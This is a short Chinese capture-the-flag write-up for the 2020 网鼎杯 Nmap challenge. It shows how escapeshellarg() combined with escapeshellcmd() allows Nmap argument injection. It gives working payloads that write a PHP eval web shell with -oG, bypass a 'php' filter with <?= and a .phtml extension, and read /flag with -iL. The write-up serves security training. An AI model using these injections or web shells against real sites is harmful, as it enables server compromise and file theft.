# \[网鼎杯 2020 朱雀组]Nmap

## \[网鼎杯 2020 朱雀组]Nmap

## 考点

* Nmap使用
* escapeshellarg()+escapeshellcmd() 之殇
* 文件上传bypass
  * `phtml`绕过php黑名单
  * `<?=`绕过php黑名单

## wp

抓包可以看到请求的内容为`host=127.0.0.1`，没有其他东西。

* 传入`127.0.0.1' -o xxxx`，提示hostname是`127.0.0.1\`，访问xxxx无结果
* 传入`127.0.0.1 -o xxxx'`提示hostname是`127.0.0.1 -o xxxx\'`，访问xxxx无结果
* 传入`'127.0.0.1 -o xxxx '`，提示`Host maybe down`
* 访问xxxx，发现语句如下

```
nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/47cae -o xxxx \127.0.0.1 \\
```

这就和[\[BUUCTF 2018\]Online Tool](buuctf-2018-online-tool.md)一样，那传入`127.0.0.1' -o xxxx`，应该访问`xxxx'`

使用同样的payload，提示`Hacker...`

```
'<?php eval($_POST["a"]);?> -oG shell.php '
```

测试发现过滤了php，`<?php`可以使用`<?=`绕过，写入的shell文件后缀可以使用`phtml`绕过

```
'<?=eval($_POST[1]);?> -oG shell.phtml '
```

蚁剑连接或者直接连接即可。

在Nmap中还有一个参数`-iL`是从文件中加载URL，也就是说，可以利用这一点进行文件读取

```
127.0.0.1' -iL /flag -o xxxx
```

![](<../../.gitbook/assets/image (1).png>)

## 小结

1. [PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)
2. 类似[\[BUUCTF 2018\]Online Tool](buuctf-2018-online-tool.md)



